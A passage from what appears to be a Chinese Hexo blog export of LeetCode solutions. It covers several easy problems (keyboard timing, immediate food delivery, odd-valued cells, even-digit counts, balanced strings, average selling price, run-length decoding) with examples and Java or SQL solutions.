<h3 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sales 表：</span><br><span class="line">+---------+------------+------+----------+-------+</span><br><span class="line">| sale_id | product_id | year | quantity | price |</span><br><span class="line">+---------+------------+------+----------+-------+ </span><br><span class="line">| 1       | 100        | 2008 | 10       | 5000  |</span><br><span class="line">| 2       | 100        | 2009 | 12       | 5000  |</span><br><span class="line">| 7       | 200        | 2011 | 15       | 9000  |</span><br><span class="line">+---------+------------+------+----------+-------+</span><br><span class="line"></span><br><span class="line">Product 表：</span><br><span class="line">+------------+--------------+</span><br><span class="line">| product_id | product_name |</span><br><span class="line">+------------+--------------+</span><br><span class="line">| 100        | Nokia        |</span><br><span class="line">| 200        | Apple        |</span><br><span class="line">| 300        | Samsung      |</span><br><span class="line">+------------+--------------+</span><br><span class="line"></span><br><span class="line">Result 表：</span><br><span class="line">+--------------+-------+-------+</span><br><span class="line">| product_name | year  | price |</span><br><span class="line">+--------------+-------+-------+</span><br><span class="line">| Nokia        | 2008  | 5000  |</span><br><span class="line">| Nokia        | 2009  | 5000  |</span><br><span class="line">| Apple        | 2011  | 9000  |</span><br><span class="line">+--------------+-------+-------+</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">select P.product_name,S.year,S.price from Sales S,Product P where S.product_id=P.product_id</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>1165. 单行键盘</title>
    <url>/2020/04/09/LeetCode/leetcode-001165-%E5%8D%95%E8%A1%8C%E9%94%AE%E7%9B%98/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>我们定制了一款特殊的力扣键盘，所有的键都排列在一行上。</p>
<p>我们可以按从左到右的顺序，用一个长度为 26 的字符串 keyboard （索引从 0 开始，到 25 结束）来表示该键盘的键位布局。</p>
<p>现在需要测试这个键盘是否能够有效工作，那么我们就需要个机械手来测试这个键盘。</p>
<p>最初的时候，机械手位于左边起第一个键（也就是索引为 0 的键）的上方。当机械手移动到某一字符所在的键位时，就会在终端上输出该字符。</p>
<p>机械手从索引 i 移动到索引 j 所需要的时间是 |i - j|。</p>
<p>当前测试需要你使用机械手输出指定的单词 word，请你编写一个函数来计算机械手输出该单词所需的时间。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：keyboard &#x3D; &quot;abcdefghijklmnopqrstuvwxyz&quot;, word &#x3D; &quot;cba&quot;</span><br><span class="line">输出：4</span><br><span class="line">解释：</span><br><span class="line">机械手从 0 号键移动到 2 号键来输出 &#39;c&#39;，又移动到 1 号键来输出 &#39;b&#39;，接着移动到 0 号键来输出 &#39;a&#39;。</span><br><span class="line">总用时 &#x3D; 2 + 1 + 1 &#x3D; 4.</span><br></pre></td></tr></table></figure>

<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：keyboard &#x3D; &quot;pqrstuvwxyzabcdefghijklmno&quot;, word &#x3D; &quot;leetcode&quot;</span><br><span class="line">输出：73</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li>keyboard.length == 26</li>
<li><code>keyboard</code> 按某种特定顺序排列，并包含每个小写英文字母一次。</li>
<li>1 &lt;= word.length &lt;= 10^4</li>
<li><code>word[i]</code> 是一个小写英文字母</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>借助HashMap，保存索引的位置</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">calculateTime</span><span class="params">(String keyboard, String word)</span> </span>&#123;</span><br><span class="line">        Map&lt;Character, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; keyboard.length();i++) &#123;</span><br><span class="line">            map.put(keyboard.charAt(i), i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; word.length();i++) &#123;</span><br><span class="line">            sum += Math.abs(map.get(word.charAt(i)) - map.get(word.charAt(i - <span class="number">1</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        sum += map.get(word.charAt(<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>1173. 即时食物配送 I</title>
    <url>/2020/04/09/LeetCode/leetcode-001173-%E5%8D%B3%E6%97%B6%E9%A3%9F%E7%89%A9%E9%85%8D%E9%80%81%20I/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>配送表: <code>Delivery</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-----------------------------+---------+</span><br><span class="line">| Column Name                 | Type    |</span><br><span class="line">+-----------------------------+---------+</span><br><span class="line">| delivery_id                 | int     |</span><br><span class="line">| customer_id                 | int     |</span><br><span class="line">| order_date                  | date    |</span><br><span class="line">| customer_pref_delivery_date | date    |</span><br><span class="line">+-----------------------------+---------+</span><br><span class="line">delivery_id 是表的主键。</span><br><span class="line">该表保存着顾客的食物配送信息，顾客在某个日期下了订单，并指定了一个期望的配送日期（和下单日期相同或者在那之后）。</span><br></pre></td></tr></table></figure>

<p>如果顾客期望的配送日期和下单日期相同，则该订单称为 「即时订单」，否则称为「计划订单」。</p>
<p>写一条 SQL 查询语句获取即时订单所占的比例， 保留两位小数。</p>
<p>查询结果如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Delivery 表:</span><br><span class="line">+-------------+-------------+------------+-----------------------------+</span><br><span class="line">| delivery_id | customer_id | order_date | customer_pref_delivery_date |</span><br><span class="line">+-------------+-------------+------------+-----------------------------+</span><br><span class="line">| 1           | 1           | 2019-08-01 | 2019-08-02                  |</span><br><span class="line">| 2           | 5           | 2019-08-02 | 2019-08-02                  |</span><br><span class="line">| 3           | 1           | 2019-08-11 | 2019-08-11                  |</span><br><span class="line">| 4           | 3           | 2019-08-24 | 2019-08-26                  |</span><br><span class="line">| 5           | 4           | 2019-08-21 | 2019-08-22                  |</span><br><span class="line">| 6           | 2           | 2019-08-11 | 2019-08-13                  |</span><br><span class="line">+-------------+-------------+------------+-----------------------------+</span><br><span class="line"></span><br><span class="line">Result 表:</span><br><span class="line">+----------------------+</span><br><span class="line">| immediate_percentage |</span><br><span class="line">+----------------------+</span><br><span class="line">| 33.33                |</span><br><span class="line">+----------------------+</span><br><span class="line">2 和 3 号订单为即时订单，其他的为计划订单。</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>嵌套</p>
<h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">select <span class="title">round</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">(select count(*)</span> from Delivery where order_date</span>=customer_pref_delivery_date) /</span><br><span class="line">(<span class="function">select <span class="title">count</span><span class="params">(*)</span> from Delivery),4</span></span><br><span class="line"><span class="function">)*100 as immediate_percentage</span></span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>官方题解</p>
<h4 id="SQL-1"><a href="#SQL-1" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> </span><br><span class="line">    <span class="keyword">round</span>(</span><br><span class="line">        (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> Delivery <span class="keyword">where</span> order_date=customer_pref_delivery_date) /</span><br><span class="line">        (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> Delivery), <span class="number">4</span></span><br><span class="line">    ) * <span class="number">100</span></span><br><span class="line"><span class="keyword">as</span> immediate_percentage</span><br></pre></td></tr></table></figure>

<h3 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h3><p>条件选择</p>
<h4 id="SQL-2"><a href="#SQL-2" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">round</span>(</span><br><span class="line">    <span class="keyword">sum</span>(<span class="keyword">case</span> <span class="keyword">when</span> order_date=customer_pref_delivery_date <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>) /</span><br><span class="line">    <span class="keyword">count</span>(*)</span><br><span class="line">   ,<span class="number">4</span>)*<span class="number">100</span></span><br><span class="line"><span class="keyword">as</span> immediate_percentage</span><br><span class="line"><span class="keyword">from</span> Delivery</span><br></pre></td></tr></table></figure>

<h3 id="解法四："><a href="#解法四：" class="headerlink" title="解法四："></a>解法四：</h3><p>逻辑真值</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">round</span>(</span><br><span class="line">    <span class="keyword">sum</span>(order_date=customer_pref_delivery_date) /</span><br><span class="line">    <span class="keyword">count</span>(*)</span><br><span class="line">    ,<span class="number">4</span>)*<span class="number">100</span></span><br><span class="line"><span class="keyword">as</span> immediate_percentage</span><br><span class="line"><span class="keyword">from</span> Delivery</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/Hello_JavaScript/article/details/104625103" target="_blank" rel="noopener">LeetCode-1173. 即时食物配送 I（简单）</a></p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>1252. 奇数值单元格的数目</title>
    <url>/2020/04/09/LeetCode/leetcode-001252-%E5%A5%87%E6%95%B0%E5%80%BC%E5%8D%95%E5%85%83%E6%A0%BC%E7%9A%84%E6%95%B0%E7%9B%AE/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个 n 行 m 列的矩阵，最开始的时候，每个单元格中的值都是 0。</p>
<p>另有一个索引数组 indices，indices[i] = [ri, ci] 中的 ri 和 ci 分别表示指定的行和列（从 0 开始编号）。</p>
<p>你需要将每对 [ri, ci] 指定的行和列上的所有单元格的值加 1。</p>
<p>请你在执行完所有 indices 指定的增量操作后，返回矩阵中 「奇数值单元格」 的数目。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/11/06/e1.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 2, m &#x3D; 3, indices &#x3D; [[0,1],[1,1]]</span><br><span class="line">输出：6</span><br><span class="line">解释：最开始的矩阵是 [[0,0,0],[0,0,0]]。</span><br><span class="line">第一次增量操作后得到 [[1,2,1],[0,1,0]]。</span><br><span class="line">最后的矩阵是 [[1,3,1],[1,3,1]]，里面有 6 个奇数。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/11/06/e2.png" alt></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：n = <span class="number">2</span>, m = <span class="number">2</span>, indices = [[<span class="number">1</span>,<span class="number">1</span>],[<span class="number">0</span>,<span class="number">0</span>]]</span><br><span class="line">输出：<span class="number">0</span></span><br><span class="line">解释：最后的矩阵是 [[<span class="number">2</span>,<span class="number">2</span>],[<span class="number">2</span>,<span class="number">2</span>]]，里面没有奇数。</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li>1 &lt;= n &lt;= 50</li>
<li>1 &lt;= m &lt;= 50</li>
<li>1 &lt;= indices.length &lt;= 100</li>
<li>0 &lt;= indices[i][0] &lt; n</li>
<li>0 &lt;= indices[i][1] &lt; m</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用两个数组分别报错，每个行或者列上自增的次数。</p>
<p>找到所有行和列之和为奇数的位置，即可。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">oddCells</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m, <span class="keyword">int</span>[][] indices)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span>[] row = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">		<span class="keyword">int</span>[] col = <span class="keyword">new</span> <span class="keyword">int</span>[m];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; indices.length; i++) &#123;</span><br><span class="line">			row[indices[i][<span class="number">0</span>]]++;</span><br><span class="line">			col[indices[i][<span class="number">1</span>]]++;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">				<span class="keyword">if</span> (<span class="number">1</span> == (row[i] + col[j]) % <span class="number">2</span>) &#123;</span><br><span class="line">					ans++;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> ans;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>矩阵</tag>
      </tags>
  </entry>
  <entry>
    <title>1295. 统计位数为偶数的数字</title>
    <url>/2020/04/09/LeetCode/leetcode-001295-%E7%BB%9F%E8%AE%A1%E4%BD%8D%E6%95%B0%E4%B8%BA%E5%81%B6%E6%95%B0%E7%9A%84%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个整数数组 <code>nums</code>，请你返回其中位数为 <strong>偶数</strong> 的数字的个数。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [12,345,2,6,7896]</span><br><span class="line">输出：2</span><br><span class="line">解释：</span><br><span class="line">12 是 2 位数字（位数为偶数） </span><br><span class="line">345 是 3 位数字（位数为奇数）  </span><br><span class="line">2 是 1 位数字（位数为奇数） </span><br><span class="line">6 是 1 位数字 位数为奇数） </span><br><span class="line">7896 是 4 位数字（位数为偶数）  </span><br><span class="line">因此只有 12 和 7896 是位数为偶数的数字</span><br></pre></td></tr></table></figure>

<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [555,901,482,1771]</span><br><span class="line">输出：1 </span><br><span class="line">解释： </span><br><span class="line">只有 1771 是位数为偶数的数字。</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li><code>1 &lt;= nums.length &lt;= 500</code></li>
<li><code>1 &lt;= nums[i] &lt;= 10^5</code></li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>转为String，判断string的长度</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findNumbers</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">            String string = String.valueOf(num);</span><br><span class="line">            <span class="keyword">if</span> (string.length() % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>求每个数字的长度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public int findNumbers(int[] nums) &#123;</span><br><span class="line">        int count &#x3D; 0;</span><br><span class="line">        for (int num : nums) &#123;</span><br><span class="line">            if (getNumLength(num) % 2 &#x3D;&#x3D; 0) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private int getNumLength(int num) &#123;</span><br><span class="line">        int count &#x3D; 0;</span><br><span class="line">        while (num &gt; 0) &#123;</span><br><span class="line">            num &#x2F;&#x3D; 10;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">        return count;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h3><p>使用对数函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public int findNumbers(int[] nums) &#123;</span><br><span class="line">        int count &#x3D; 0;</span><br><span class="line">        for (int num : nums) &#123;</span><br><span class="line">            if (((int) (Math.log10(num) + 1)) % 2 &#x3D;&#x3D; 0) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return count;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>1221. 分割平衡字符串</title>
    <url>/2020/04/09/LeetCode/leetcode-001221-%E5%88%86%E5%89%B2%E5%B9%B3%E8%A1%A1%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>在一个「平衡字符串」中，’L’ 和 ‘R’ 字符的数量是相同的。</p>
<p>给出一个平衡字符串 s，请你将它分割成尽可能多的平衡字符串。</p>
<p>返回可以通过分割得到的平衡字符串的最大数量。</p>
<p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/split-a-string-in-balanced-strings" target="_blank" rel="noopener">https://leetcode-cn.com/problems/split-a-string-in-balanced-strings</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;RLRRLLRLRL&quot;</span><br><span class="line">输出：4</span><br><span class="line">解释：s 可以分割为 &quot;RL&quot;, &quot;RRLL&quot;, &quot;RL&quot;, &quot;RL&quot;, 每个子字符串中都包含相同数量的 &#39;L&#39; 和 &#39;R&#39;。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：s = <span class="string">"RLLLLRRRLR"</span></span><br><span class="line">输出：<span class="number">3</span></span><br><span class="line">解释：s 可以分割为 <span class="string">"RL"</span>, <span class="string">"LLLRRR"</span>, <span class="string">"LR"</span>, 每个子字符串中都包含相同数量的 <span class="string">'L'</span> 和 <span class="string">'R'</span>。</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：s = <span class="string">"LLLLRRRR"</span></span><br><span class="line">输出：<span class="number">1</span></span><br><span class="line">解释：s 只能保持原样 <span class="string">"LLLLRRRR"</span>.</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>贪心。</p>
<p>使用一个变量count来保存碰到的L和R。初始化为0，如果遇到L，自增1，如遇到R自减1，当变量count为0时，说明前面的字符串已经平衡了，总数加一</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">balancedStringSplit</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; s.length();i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">'L'</span> == s.charAt(i)) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">'R'</span> == s.charAt(i)) &#123;</span><br><span class="line">                count--;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> == count) &#123;</span><br><span class="line">                result++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
        <tag>贪心</tag>
      </tags>
  </entry>
  <entry>
    <title>1251. 平均售价</title>
    <url>/2020/04/09/LeetCode/leetcode-001251-%E5%B9%B3%E5%9D%87%E5%94%AE%E4%BB%B7/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Table: <code>Prices</code></p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------------+---------+</span><br><span class="line">| Column Name   | Type    |</span><br><span class="line">+---------------+---------+</span><br><span class="line">| product_id    | int     |</span><br><span class="line">| start_date    | date    |</span><br><span class="line">| end_date      | date    |</span><br><span class="line">| price         | int     |</span><br><span class="line">+---------------+---------+</span><br><span class="line">(product_id，start_date，end_date) 是 Prices 表的主键。</span><br><span class="line">Prices 表的每一行表示的是某个产品在一段时期内的价格。</span><br><span class="line">每个产品的对应时间段是不会重叠的，这也意味着同一个产品的价格时段不会出现交叉。</span><br></pre></td></tr></table></figure>

<p>Table: <code>UnitsSold</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">+---------------+---------+</span><br><span class="line">| Column Name   | Type    |</span><br><span class="line">+---------------+---------+</span><br><span class="line">| product_id    | <span class="keyword">int</span>     |</span><br><span class="line">| purchase_date | date    |</span><br><span class="line">| units         | <span class="keyword">int</span>     |</span><br><span class="line">+---------------+---------+</span><br><span class="line">UnitsSold 表没有主键，它可能包含重复项。</span><br><span class="line">UnitsSold 表的每一行表示的是每种产品的出售日期，单位和产品 id。</span><br></pre></td></tr></table></figure>

<p>编写SQL查询以查找每种产品的平均售价。<br> <code>average_price</code> 应该四舍五入到小数点后两位。<br> 查询结果格式如下例所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Prices table:</span><br><span class="line">+------------+------------+------------+--------+</span><br><span class="line">| product_id | start_date | end_date   | price  |</span><br><span class="line">+------------+------------+------------+--------+</span><br><span class="line">| 1          | 2019-02-17 | 2019-02-28 | 5      |</span><br><span class="line">| 1          | 2019-03-01 | 2019-03-22 | 20     |</span><br><span class="line">| 2          | 2019-02-01 | 2019-02-20 | 15     |</span><br><span class="line">| 2          | 2019-02-21 | 2019-03-31 | 30     |</span><br><span class="line">+------------+------------+------------+--------+</span><br><span class="line"> </span><br><span class="line">UnitsSold table:</span><br><span class="line">+------------+---------------+-------+</span><br><span class="line">| product_id | purchase_date | units |</span><br><span class="line">+------------+---------------+-------+</span><br><span class="line">| 1          | 2019-02-25    | 100   |</span><br><span class="line">| 1          | 2019-03-01    | 15    |</span><br><span class="line">| 2          | 2019-02-10    | 200   |</span><br><span class="line">| 2          | 2019-03-22    | 30    |</span><br><span class="line">+------------+---------------+-------+</span><br><span class="line"></span><br><span class="line">Result table:</span><br><span class="line">+------------+---------------+</span><br><span class="line">| product_id | average_price |</span><br><span class="line">+------------+---------------+</span><br><span class="line">| 1          | 6.96          |</span><br><span class="line">| 2          | 16.96         |</span><br><span class="line">+------------+---------------+</span><br><span class="line">平均售价 &#x3D; 产品总价 &#x2F; 销售的产品数量。</span><br><span class="line">产品 1 的平均售价 &#x3D; ((100 * 5)+(15 * 20) )&#x2F; 115 &#x3D; 6.96</span><br><span class="line">产品 2 的平均售价 &#x3D; ((200 * 15)+(30 * 30) )&#x2F; 230 &#x3D; 16.96</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Write your MySQL query statement below</span><br><span class="line">select p.product_id,round(sum(units*price)/sum(units),<span class="number">2</span>) as average_price from Prices p join UnitsSold u on p.product_id=u.product_id and u.purchase_date between p.start_date and p.end_date group by product_id</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>1313. 解压缩编码列表</title>
    <url>/2020/04/09/LeetCode/leetcode-001313-%E8%A7%A3%E5%8E%8B%E7%BC%A9%E7%BC%96%E7%A0%81%E5%88%97%E8%A1%A8/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个以行程长度编码压缩的整数列表 nums 。</p>
<p>考虑每对相邻的两个元素 freq, val] = [nums[2<em>i], nums[2</em>i+1]] （其中 i &gt;= 0 ），每一对都表示解压后子列表中有 freq 个值为 val 的元素，你需要从左到右连接所有子列表以生成解压后的列表。</p>
<p>请你返回解压后的列表。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,2,3,4]</span><br><span class="line">输出：[2,4,4,4]</span><br><span class="line">解释：第一对 [1,2] 代表着 2 的出现频次为 1，所以生成数组 [2]。</span><br><span class="line">第二对 [3,4] 代表着 4 的出现频次为 3，所以生成数组 [4,4,4]。</span><br><span class="line">最后将它们串联到一起 [2] + [4,4,4] &#x3D; [2,4,4,4]。</span><br></pre></td></tr></table></figure>

<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,1,2,3]</span><br><span class="line">输出：[1,3,3]</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li><code>2 &lt;= nums.length &lt;= 100</code></li>
<li><code>nums.length % 2 == 0</code></li>
<li><code>1 &lt;= nums[i] &lt;= 100</code></li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>计数</p>
